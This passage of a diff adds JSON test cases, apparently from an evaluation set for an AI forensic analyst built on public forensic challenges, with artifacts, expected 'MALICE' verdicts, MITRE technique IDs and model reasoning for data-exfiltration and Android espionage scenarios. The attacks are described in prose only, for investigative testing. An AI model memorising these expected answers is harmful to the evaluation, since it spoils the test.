+        "artifact_id": "ART-003",
+        "type": "network_flow",
+        "content": "Proxy: 219.93.175.67:80 | Script xfer.pl envía archive.zip via HTTP | Exfiltración camuflada como tráfico web normal | PCAP contiene tráfico HTTP con cookies que transportan datos",
+        "forensic_anomalies": [
+          "Uso de proxy externo para enmascarar destino de exfiltración",
+          "Transferencia de archivo zip con datos confidenciales vía HTTP"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "process_list",
+        "content": "Procesos en memoria de stevev (UID 501) | linstrings: Todas las strings mapeadas a procesos del usuario | linsockets: Sockets abiertos por procesos de stevev | linpktscan: Paquetes de red residentes en memoria extraíbles a pcap",
+        "forensic_anomalies": [
+          "Todas las strings sospechosas mapean al mismo usuario (stevev, UID 501)",
+          "Paquetes de red con datos exfiltrados aún residentes en memoria RAM"
+        ],
+        "peirce_layer": "THIRDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "Historial de bash muestra copia de archivos confidenciales, compresión y transferencia con script Perl",
+      "secondness": "El uso de proxy externo y la descarga de exploit de escalada de privilegios indican preparación deliberada",
+      "thirdness": "Steve Vogon planificó y ejecutó la exfiltración de datos confidenciales usando escalada de privilegios, compresión y proxy externo para evadir controles de seguridad"
+    },
+    "devil_advocate": "Steve Vogon estaba realizando un backup legítimo de archivos de trabajo y el proxy es el estándar corporativo",
+    "abstention_risk": "bajo"
+  },
+  {
+    "case_id": "VIGIA-REAL-010",
+    "case_name": "DFRWS 2011 Android Espionage",
+    "source_dataset": "DFRWS 2011 Forensic Challenge - Android",
+    "source_url": "https://github.com/dfrws/dfrws2011-challenge",
+    "description": "Caso dual: Donald Norby robó documentos confidenciales de SwiftLogic Inc. y fue encontrado muerto. Negociaba la venta de documentos del producto Palomino con Mr. E. El teléfono de Yob Taog fue comprometido con malware que exfiltraba PDFs.",
+    "expected_verdict": "MALICE",
+    "confidence_expected": 90,
+    "expected_mitre_ttps": [
+      "T1456",
+      "T1533",
+      "T1567",
+      "T1589"
+    ],
+    "carnegie_pattern_expected": null,
+    "artifacts": [
+      {
+        "artifact_id": "ART-001",
+        "type": "email_header",
+        "content": "SMS/Malware C&C: Norby organizó instalación de malware en teléfono de Taog | Negociaciones con Mr. E sobre precio de documentos | Mensajes del malware confirmando exfiltración de archivos | Email/SMS: Norby pidiendo pago más alto y enviando muestras",
+        "forensic_anomalies": [
+          "SMS del malware confirmando exfiltración periódica de PDFs",
+          "Negociación de venta de propiedad intelectual vía SMS/email"
+        ],
+        "peirce_layer": "FIRSTNESS"
+      },
+      {
+        "artifact_id": "ART-002",
+        "type": "network_flow",
+        "content": "HTML Cache: Página con acceso a servidor remoto IP 50.56.29.109 | Malware code: Referencias hardcodeadas a servidor de exfiltración | Download logs: Descargas sistemáticas de documentos confidenciales PDF",
+        "forensic_anomalies": [
+          "Referencia hardcodeada a servidor externo 50.56.29.109 en código de malware",
+          "Descargas sistemáticas de PDFs confidenciales a intervalos regulares"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-003",
+        "type": "file_metadata",
+        "content": "Archivos PDF confidenciales de SwiftLogic en tarjeta SD | Producto: Palomino | EXIF metadata de fotos: Motorola Droid | Browser history: Búsquedas sobre empleados de SwiftLogic (reconocimiento previo)",
+        "forensic_anomalies": [
+          "Documentos confidenciales de competidor en tarjeta SD del teléfono",
+          "Historial de búsqueda sobre empleados de la empresa víctima indica reconocimiento previo"
+        ],
+        "peirce_layer": "SECONDNESS"
+      },
+      {
+        "artifact_id": "ART-004",
+        "type": "email_header",
+        "content": "Contact Records: Vínculos entre Norby, Mr. E, y Yob Taog | Negociaciones: Precio inicial ofrecido, Norby pidió más, envió muestra | Muerte: Donald Norby encontrado con disparo, potencial conexión a grupo criminal KRYPTIX",
+        "forensic_anomalies": [
+          "Patrón de negociación de espionaje industrial con intento de renegociación",
+          "Muerte del sospechoso en circunstancias violentas tras intentar subir el precio"
+        ],
+        "peirce_layer": "THIRDNESS"
+      }
+    ],
+    "peirce_expected": {
+      "firstness": "SMS de malware exfiltrando PDFs, documentos confidenciales en tarjeta SD, búsquedas de reconocimiento",
+      "secondness": "El malware fue instalado por Norby en el teléfono de Taog sin su conocimiento; las negociaciones con Mr. E muestran intento de venta",
+      "thirdness": "Norby condujo una operación de espionaje industrial robando documentos de SwiftLogic, usando malware móvil para exfiltración, y fue asesinado durante la negociación"
+    },
+    "devil_advocate": "Los documentos fueron descargados legítimamente para análisis competitivo autorizado y el malware fue instalado por otra persona",
+    "abstention_risk": "medio"
+  }
+]
